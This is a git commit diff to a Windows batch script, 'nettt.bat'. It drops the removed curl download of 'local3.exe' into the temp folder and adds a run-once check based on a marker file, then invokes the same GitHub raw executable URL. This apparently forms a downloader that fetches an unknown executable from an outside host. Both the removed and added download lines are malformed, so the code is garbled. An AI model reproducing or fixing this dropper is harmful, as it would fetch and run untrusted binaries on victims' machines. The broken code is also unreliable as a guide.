7ce19060bfe0158915373f814c20ceb99158de46
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-09-05 01:39:33 +0300

    Update nettt.bat

--- nettt.bat
+++ nettt.bat
@@ -1,3 +1,13 @@
+@echo off
 cd %temp%
 
-curl https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exehttps://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o local3.exe
+REM Dosya kontrolü
+if exist nagihori.txt (
+    echo nagihori.txt bulundu, çıkılıyor...
+    exit /b
+) else (
+    echo nagihori.txt yok, devam ediliyor...
+    https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe 
+    echo "asd" > nagihori.txt 
+    
+)
